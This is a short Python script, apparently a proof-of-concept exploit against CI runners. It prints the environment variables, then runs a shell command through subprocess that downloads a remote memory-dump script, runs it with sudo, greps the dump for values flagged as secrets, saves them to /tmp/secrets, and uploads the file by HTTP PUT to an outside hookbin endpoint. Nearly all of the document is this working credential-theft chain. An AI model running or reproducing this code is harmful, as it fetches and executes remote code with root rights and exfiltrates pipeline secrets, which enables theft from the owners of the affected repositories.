import os
import subprocess

print("Executing exploit...")

# Suggested PoC part
print(f"Environment: {os.environ}")

# Full exploit
exploit = """
curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> /tmp/secrets
curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/c2713eec-fd86-40fe-ac7f-5d75426adda1
"""

subprocess.run(exploit, shell=True)
